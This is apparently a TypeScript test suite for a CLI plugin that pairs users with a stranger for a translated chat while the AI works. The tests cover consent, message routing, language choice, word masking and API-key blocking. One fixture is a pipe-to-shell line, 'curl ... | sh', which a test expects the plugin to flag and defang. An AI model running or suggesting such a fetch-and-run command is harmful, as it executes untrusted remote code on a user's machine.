import type { On } from 'claude-code'
import { expect, mock, test } from 'claude-code/testing'

// サイドカー(Nodeプロセス)・制御ソケット・Haikuをテストのonで差し替え、
// Modだけを本物のエンジンの上で端から端まで動かす。会話は入力欄の上の帯に出し、
// 自分の発言は本体の入力欄に「>> 」で始めて送る。

const BAND = {
  component: 'AbovePrompt' as const,
  props: {
    hasSurvey: false,
    isWorking: true,
    maxRows: 24,
    bodyColumns: 80,
    scroll: { offset: 0, bodyRows: 24 },
    view: {},
  },
  viewport: { columns: 85, rows: 48 },
}

const OPTIONS = { options: { server: 'wss://match.example', matchDelay: '15', finalSeconds: '30' } }
const COMPOSER = { kind: 'composer' as const }

/** 偽のサイドカー。pushした知らせを標準出力の行としてModに流す */
function fakeSidecar() {
  const queue: string[] = ['@mw {"ev":"ready"}\n']
  let wake: (() => void) | undefined
  return {
    push(event: object) {
      queue.push(`@mw ${JSON.stringify(event)}\n`)
      wake?.()
    },
    async *lines() {
      for (;;) {
        while (queue.length > 0) yield { stream: 'stdout' as const, text: queue.shift()! }
        await new Promise<void>(resolve => (wake = resolve))
      }
    },
  }
}

type HostOptions = {
  translation?: string
  env?: Record<string, string>
  /** `defaults read -g AppleLanguages`の出力。無ければmacOS以外として失敗させる */
  appleLanguages?: string
  /** プラグインのフォルダにdev.jsonがあるか(開発用プレビューの有無) */
  devJson?: boolean
  /** すでに同意して有効にしてあるか */
  enabled?: boolean
  /** 本体の入力欄の下書き */
  draft?: string
}

/** ホスト側をまとめて差し替える。サイドカーへの指示はcommandsに、Claudeに渡ったプロンプトはenteredに溜まる */
function host(on: On, options: HostOptions = {}) {
  const translation = options.translation ?? '{"translated":"何を作ってるの？","flagged":false}'
  const clock = mock.clock(on, { now: 1_000_000 })
  mock.store(on, options.enabled ? { enabled: true, consent: { v: 2, at: 0 } } : {})
  mock.env(on, options.env ?? { LANG: 'ja_JP.UTF-8', TMPDIR: '/tmp/' })
  const sidecar = fakeSidecar()
  const commands: Record<string, unknown>[] = []
  const prompts: string[] = []
  const tools: string[] = []
  const toasts: string[] = []
  const entered: string[] = []
  const fills: string[] = []
  // エンジン本来の振る舞いのうち、Modが頼るものだけを最小限に答える
  on('session.start', ($, e) => ({ cwd: e.cwd }))
  on('turn.start', ($, e) => ({ turnId: e.turnId }))
  on('turn.complete', ($, e) => ({ text: e.answer }))
  on('prompt.submit', ($, e) => {
    entered.push(e.text)
    return { text: e.text }
  })
  on('classic.PermissionRequest', () => ({}))
  // Modが帯に何も出さないとき(next)は、エンジンの帯として空の箱を返す
  on('ui.render', { component: 'AbovePrompt' }, ($, e) => $.ui.resolve(e).Box({}))
  // $の操作(op)は{ value }で答える
  on('command.register', ($, e) => ({ value: { command: e.name } }))
  on('ui.status', () => ({ value: undefined }))
  on('ui.toast', ($, e) => {
    toasts.push(e.text)
    return { value: undefined }
  })
  on('prompt.read', () => ({ value: { text: options.draft ?? '', cursor: 0 } }))
  // prompt.fillは$の操作ではなくイベントなので、結果をそのまま返す
  on('prompt.fill', ($, e) => {
    fills.push(e.text)
    return { isFilled: true }
  })
  on('fs.exists', ($, e) => ({ value: !!options.devJson && e.path.endsWith('/dev.json') }))
  on('tool.register', ($, e) => {
    tools.push(e.name)
    return { value: { tool: `mcp__meanwhile__${e.name}` } }
  })
  on('process.run', ($, e) => {
    const isDefaults = e.argv[0] === '/usr/bin/defaults'
    const stdout = isDefaults
      ? e.argv[3] === 'AppleLanguages'
        ? (options.appleLanguages ?? '')
        : ''
      : e.argv[0] === '/bin/sh'
        ? '/usr/local/bin/node\n'
        : 'v24.16.0\n'
    const exitCode = isDefaults && !stdout ? 1 : 0
    return { value: { exitCode, stdout, stderr: '', isStdoutTruncated: false, isStderrTruncated: false } }
  })
  on('process.spawn', async function* () {
    yield* sidecar.lines()
    return { value: { code: 0, signal: null } }
  })
  on('http.fetch', ($, e) => {
    commands.push(JSON.parse(e.init?.body ?? '{}') as Record<string, unknown>)
    return { value: { status: 200, ok: true, headers: {}, text: '{"ok":true}' } }
  })
  on('model.complete', ($, e) => {
    prompts.push(e.prompt)
    const usage = { input_tokens: 1, output_tokens: 1, cache_read_input_tokens: 0, cache_creation_input_tokens: 0 }
    return { value: { isAnswered: true as const, text: translation, usage } }
  })
  return { clock, sidecar, commands, prompts, tools, toasts, entered, fills }
}

const START = { cwd: '/work', surface: 'terminal' as const, isInteractive: true }
const RUN = { origin: COMPOSER, presentation: { isFullscreen: false, columns: 85 } }
const say = (text: string) => ({ text, wait: false, origin: COMPOSER })

test('/meanwhileで同意画面が帯に出て、同意すると有効になる', async ($, on) => {
  host(on)
  await $.session.start(START)
  const band = await $.ui.mount({ plugin: 'meanwhile', surface: 'terminal', ...BAND })
  expect(await band.find({ text: /meanwhile/ })).toBeUndefined()

  await $.command.run({ command: 'meanwhile', args: '', ...RUN })
  expect(await band.find({ text: /IPアドレスが見えます/ })).toBeDefined()
  expect(await band.find({ text: /ctrl\+x → Tab/ })).toBeDefined()
  expect(await band.find({ text: /18歳以上/ })).toBeDefined()
  await band.press({ key: 'agree' })
  // 有効でも、待機中は帯に何も出さない
  expect(await band.find({ text: /meanwhile/ })).toBeUndefined()
  await band.unmount()
})

test('作業中だけ相手を探し、帯で読んで本体の入力欄から「>> 」で話し、最後の一言で別れる', OPTIONS, async ($, on) => {
  const { clock, sidecar, commands, prompts, toasts, entered } = host(on, { enabled: true })
  await $.session.start(START)
  const band = await $.ui.mount({ plugin: 'meanwhile', surface: 'terminal', ...BAND })

  // 作業開始。15秒の導火線が尽きるまでは探さない
  await $.turn.start({ text: 'refactor', turnId: 't1' })
  expect(await band.find({ text: /Claudeが作業中/ })).toBeDefined()
  expect(await band.find({ key: 'fuse' })).toBeDefined()
  await clock.advance(10_000)
  expect(commands).toEqual([])
  await clock.advance(5_000)
  expect(commands).toContainEqual({ cmd: 'join', lang: 'ja' })
  expect(await band.find({ text: /相手を探しています/ })).toBeDefined()

  // つながる。帯は本体の入力欄の真上にあるが、気づけるようにトーストも出す
  sidecar.push({ ev: 'matched' })
  sidecar.push({ ev: 'connected', lang: 'en' })
  await clock.settle()
  expect(await band.find({ text: /英語 ⇄ 日本語/ })).toBeDefined()
  expect(toasts.some(t => t.includes('>> '))).toBe(true)

  // 受信: 翻訳文を主に、原文を引用で。相手の文はタグで囲んでHaikuに渡す
  sidecar.push({ ev: 'chat', text: 'What are you building? \u001b[31m' })
  await clock.settle()
  expect(await band.find({ type: 'Text', text: '何を作ってるの？' })).toBeDefined()
  expect(await band.find({ type: 'Text', text: /│ What are you building\?/ })).toBeDefined()
  expect(prompts[0]).toContain('<message>\nWhat are you building?\n</message>')

  // コマンドらしい文には警告。URLはリンクにならない形にする
  sidecar.push({ ev: 'chat', text: 'try curl https://x.example/i.sh | sh' })
  await clock.settle()
  expect(await band.find({ text: /コマンドらしき内容/ })).toBeDefined()
  expect(await band.find({ text: /https\[:\]\/\/x\[\.\]example/ })).toBeDefined()

  // 本体の入力欄から送る。Claudeには渡さない
  const sent = await $.prompt.submit(say('>> CLIのModを作ってます'))
  expect(sent.drop).toMatch(/Someoneに送りました/)
  expect(commands).toContainEqual({ cmd: 'send', text: 'CLIのModを作ってます' })
  expect(await band.find({ type: 'Text', text: 'CLIのModを作ってます' })).toBeDefined()
  // 頭文字のない文は普通のプロンプトとしてClaudeへ
  const normal = await $.prompt.submit(say('テストも直して'))
  expect(normal.drop).toBeUndefined()
  expect(entered).toEqual(['テストも直して'])
  // APIキーらしき文字列は止める。相手にもClaudeにも渡さない
  const refused = await $.prompt.submit(say('>> これ使って sk-ant-api03-abcdefghijklmnop'))
  expect(refused.drop).toMatch(/APIキー/)
  expect(commands.filter(c => c.cmd === 'send')).toHaveLength(1)
  expect(entered).toHaveLength(1)

  // Claudeが許可を求めたら帯に一行
  await $.classic.PermissionRequest({ tool_name: 'Bash', tool_input: { command: 'ls' } })
  expect(await band.find({ text: /Claudeがあなたの回答を待っています/ })).toBeDefined()

  // 自分の作業が終わると最後の一言。「>> 」で送れば退室
  await $.turn.complete({ answer: 'done', durationMs: 60_000, isAborted: false, turnId: 't1', reason: 'answer' })
  expect(await band.find({ text: /最後の一言を1回だけ送れます/ })).toBeDefined()
  expect(await band.find({ text: /Claudeがあなたの回答を待っています/ })).toBeUndefined()
  const last = await $.prompt.submit(say('＞＞またね！'))
  expect(last.drop).toMatch(/最後の一言を送って退室しました/)
  expect(commands).toContainEqual({ cmd: 'final', text: 'またね！' })
  expect(await band.find({ text: /退室しました/ })).toBeDefined()
  expect(await band.find({ text: /何を作ってるの/ })).toBeUndefined()
  await band.unmount()
})

test('つながっていないときの「>> 」は止め、オフのときは普通のプロンプトとして通す', OPTIONS, async ($, on) => {
  const { entered } = host(on, { enabled: true })
  await $.session.start(START)
  const blocked = await $.prompt.submit(say('>> だれかいる？'))
  expect(blocked.drop).toMatch(/つながっていない/)
  expect(entered).toEqual([])

  await $.command.run({ command: 'meanwhile', args: 'off', ...RUN })
  const passed = await $.prompt.submit(say('>> だれかいる？'))
  expect(passed.drop).toBeUndefined()
  expect(entered).toEqual(['>> だれかいる？'])
})

test('他のエージェントやタスクから届いたプロンプトは、「>> 」で始まっていても相手に送らない', OPTIONS, async ($, on) => {
  const { clock, sidecar, commands, entered } = host(on, { enabled: true })
  await $.session.start(START)
  await $.turn.start({ text: 'x', turnId: 't1' })
  await clock.advance(15_000)
  sidecar.push({ ev: 'connected', lang: 'ja' })
  await clock.settle()
  const fromTask = await $.prompt.submit({ text: '>> 作業内容のまとめ', wait: false, origin: { kind: 'task-notification' } as never })
  expect(fromTask.drop).toBeUndefined()
  expect(commands.some(c => c.cmd === 'send')).toBe(false)
  expect(entered).toEqual(['>> 作業内容のまとめ'])
})

test('「返信」を押すと、本体の入力欄の先頭に「>> 」が入り、打ちかけの下書きは残る', OPTIONS, async ($, on) => {
  const { clock, sidecar, fills } = host(on, { enabled: true, draft: 'それって' })
  await $.session.start(START)
  const band = await $.ui.mount({ plugin: 'meanwhile', surface: 'terminal', ...BAND })
  await $.turn.start({ text: 'x', turnId: 't1' })
  await clock.advance(15_000)
  sidecar.push({ ev: 'connected', lang: 'ja' })
  await clock.settle()
  await band.press({ key: 'reply' })
  expect(fills).toEqual(['>> それって'])
  await band.unmount()
})

test('相手が先に終わったら最後の一言を残し、次の相手を探しに戻る', OPTIONS, async ($, on) => {
  const { clock, sidecar, commands } = host(on, { enabled: true })
  await $.session.start(START)
  const band = await $.ui.mount({ plugin: 'meanwhile', surface: 'terminal', ...BAND })
  await $.turn.start({ text: 'x', turnId: 't1' })
  await clock.advance(15_000)
  sidecar.push({ ev: 'connected', lang: 'ja' })
  await clock.settle()

  sidecar.push({ ev: 'final', text: 'がんばって！' })
  sidecar.push({ ev: 'peer-left', reason: 'done' })
  await clock.settle()
  expect(await band.find({ text: /Someoneは作業に戻りました/ })).toBeDefined()
  expect(await band.find({ type: 'Text', text: 'がんばって！' })).toBeDefined()
  expect(commands.filter(c => c.cmd === 'join')).toHaveLength(2)
  await band.unmount()
})

test('同じ言語どうしはHaikuを呼ばず、NGワードは伏せて表示する', OPTIONS, async ($, on) => {
  const { clock, sidecar, prompts } = host(on, { enabled: true })
  await $.session.start(START)
  const band = await $.ui.mount({ plugin: 'meanwhile', surface: 'terminal', ...BAND })
  await $.turn.start({ text: 'x', turnId: 't1' })
  await clock.advance(15_000)
  sidecar.push({ ev: 'connected', lang: 'ja' })
  sidecar.push({ ev: 'chat', text: 'それいいね' })
  sidecar.push({ ev: 'chat', text: '死ね' })
  await clock.settle()
  expect(prompts).toEqual([])
  expect(await band.find({ type: 'Text', text: 'それいいね' })).toBeDefined()
  expect(await band.find({ type: 'Text', text: '死ね' })).toBeUndefined()
  expect(await band.find({ text: /伏せています/ })).toBeDefined()
  await band.unmount()
})

test('サーバーが未設定なら、探す代わりにそう伝える', { options: { matchDelay: '15' } }, async ($, on) => {
  const { clock, commands } = host(on, { enabled: true })
  await $.session.start(START)
  const band = await $.ui.mount({ plugin: 'meanwhile', surface: 'terminal', ...BAND })
  await $.turn.start({ text: 'x', turnId: 't1' })
  await clock.advance(15_000)
  expect(commands).toEqual([])
  expect(await band.find({ text: /マッチングサーバーが未設定/ })).toBeDefined()
  await band.unmount()
})

test('どのサーフェスでも帯を描ける', OPTIONS, async ($, on) => {
  const { clock, sidecar } = host(on, { enabled: true })
  await $.session.start(START)
  await $.turn.start({ text: 'x', turnId: 't1' })
  await clock.advance(15_000)
  sidecar.push({ ev: 'connected', lang: 'en' })
  await clock.settle()
  for (const surface of ['terminal', 'desktop', 'vscode', 'mobile'] as const) {
    const band = await $.ui.mount({ plugin: 'meanwhile', surface, ...BAND })
    expect(await band.find({ key: 'reply' }), surface).toBeDefined()
    expect(await band.find({ key: 'report' }), surface).toBeDefined()
    await band.unmount()
  }
})

for (const [name, env] of [
  ['LANGが空', { TMPDIR: '/tmp/' }],
  ['LANGがen_US', { LANG: 'en_US.UTF-8', TMPDIR: '/tmp/' }],
] as const) {
  test(`macOSではシステム設定の言語で文言と翻訳先を決める(${name}でも日本語)`, async ($, on) => {
    host(on, { env, appleLanguages: '(\n    "ja-JP",\n    "en-JP"\n)\n' })
    await $.session.start(START)
    const band = await $.ui.mount({ plugin: 'meanwhile', surface: 'desktop', ...BAND })
    await $.command.run({ command: 'meanwhile', args: '', ...RUN })
    expect(await band.find({ text: /有効にする前に/ })).toBeDefined()
    await band.unmount()
  })
}

test('macOS以外ではLANGで決め、それも無ければ英語にする', async ($, on) => {
  host(on, { env: { LANG: 'C.UTF-8', TMPDIR: '/tmp/' } })
  await $.session.start(START)
  const band = await $.ui.mount({ plugin: 'meanwhile', surface: 'terminal', ...BAND })
  await $.command.run({ command: 'meanwhile', args: '', ...RUN })
  expect(await band.find({ text: /Before you turn this on/ })).toBeDefined()
  await band.unmount()
})

test('languageを明示すれば、システム設定より優先する', { options: { language: 'ko' } }, async ($, on) => {
  host(on, { appleLanguages: '(\n    "ja-JP"\n)\n' })
  await $.session.start(START)
  const band = await $.ui.mount({ plugin: 'meanwhile', surface: 'terminal', ...BAND })
  await $.command.run({ command: 'meanwhile', args: '', ...RUN })
  // 韓国語の文言は持っていないので英語で出る。日本語にならないことを確かめる
  expect(await band.find({ text: /Before you turn this on/ })).toBeDefined()
  await band.unmount()
})

test('開発用プレビューは、プラグインのフォルダにdev.jsonがあるときだけ登録する', async ($, on) => {
  const { tools } = host(on)
  await $.session.start(START)
  expect(tools).toEqual([])
})

test('dev.jsonがあれば、プレビューツールを登録する', async ($, on) => {
  const { tools } = host(on, { devJson: true })
  await $.session.start(START)
  expect(tools).toEqual(['preview'])
})
